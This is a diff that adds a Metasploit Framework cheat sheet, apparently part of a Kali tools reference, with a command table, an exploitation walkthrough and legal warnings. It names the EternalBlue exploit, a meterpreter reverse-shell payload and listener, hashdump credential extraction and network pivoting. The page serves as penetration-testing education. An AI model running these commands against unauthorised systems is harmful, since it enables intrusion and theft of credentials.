@@ -1,0 +1,137 @@
+Metasploit Framework
+World's most used penetration testing framework
+
+Exploitation
+Description
+Metasploit Framework is a powerful open-source platform for developing, testing, and executing exploit code. It contains a huge database of exploits for various vulnerabilities and provides tools for reconnaissance, exploitation, and post-exploitation activities.
+
+Installation / Check
+Check if installed:
+
+which msfconsole
+Install command:
+
+sudo apt install metasploit-framework
+Basic Syntax
+msfconsole (then use internal commands)
+Common Commands
+Command	What it does	When to use	Risk
+msfconsole
+
+Start Metasploit - Open console	Begin exploitation	
+search <keyword>
+
+Search exploits - Find by name/CVE	Find exploits	
+use exploit/path/module
+
+Load exploit - Select module	Choose attack	
+show options
+
+View settings - See required options	Configure exploit	
+set RHOSTS 192.168.1.1
+
+Set target - Configure target IP	Target specification	
+exploit / run
+
+Execute attack - Run the exploit	Launch attack	
+search type:exploit platform:windows
+
+Filter search - By type and platform	Find specific exploits	
+search cve:2021-34527
+
+Search CVE - Find by CVE number	Known vulnerability	
+info
+
+Module info - Detailed exploit info	Understand exploit	
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+Set payload - Choose shell type	Configure payload	
+set LHOST 192.168.1.100
+
+Set listener IP - Your machine IP	Receive connection	
+set LPORT 4444
+
+Set listener port - Your port	Callback port	
+sessions -l
+
+List sessions - Show active shells	View connections	
+sessions -i 1
+
+Interact session - Enter session 1	Use shell	
+use auxiliary/scanner/portscan/tcp
+
+Port scanner - MSF port scanning	In-framework scan	
+use auxiliary/scanner/smb/smb_ms17_010
+
+EternalBlue check - Scan for MS17-010	Check vuln	
+use exploit/windows/smb/ms17_010_eternalblue
+
+EternalBlue exploit - Attack Windows SMB	Exploit vuln	
+use exploit/multi/handler
+
+Multi handler - Catch reverse shells	Receive callbacks	
+setg RHOSTS 192.168.1.0/24
+
+Global variable - Set for all modules	Batch operations	
+db_nmap -sV 192.168.1.0/24
+
+DB Nmap - Scan and store results	Integrated scanning	
+hosts
+
+View hosts - Show discovered hosts	Review targets	
+services
+
+View services - Show found services	Review services	
+vulns
+
+View vulnerabilities - Show found vulns	Review findings	
+background
+
+Background session - Keep shell running	Multi-task	
+route add 10.0.0.0/24 1
+
+Add route - Pivot through session	Network pivoting	
+use post/windows/gather/hashdump
+
+Hash dump - Extract password hashes	Credential extraction	
+use post/multi/recon/local_exploit_suggester
+
+Exploit suggester - Find privesc exploits	Privilege escalation	
+makerc /root/script.rc
+
+Save commands - Create resource script	Automation	
+resource /root/script.rc
+
+Run script - Execute resource file	Automate attacks	
+Step-by-Step Guide
+1
+Start Metasploit with: msfconsole
+2
+Search for exploits: search type:exploit <keyword>
+3
+Select an exploit: use <exploit_path>
+4
+View options: show options
+5
+Set target: set RHOSTS <target_ip>
+6
+Set payload if needed: set PAYLOAD <payload_path>
+7
+Run the exploit: exploit or run
+8
+If successful, interact with the session
+Understanding the Output
+Metasploit uses color-coded output: green [+] for success, blue [*] for info, yellow [-] for failures, red [!] for errors. When an exploit works, you'll see "Meterpreter session opened" or similar.
+
+Important Warnings
+•
+Exploiting systems without authorization is a SERIOUS CRIME
+•
+Metasploit can cause system crashes and data loss
+•
+Many exploits are noisy and easily detected
+•
+Always use in isolated lab environments for learning
+•
+Professional pentesters always have legal contracts before testing
+⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
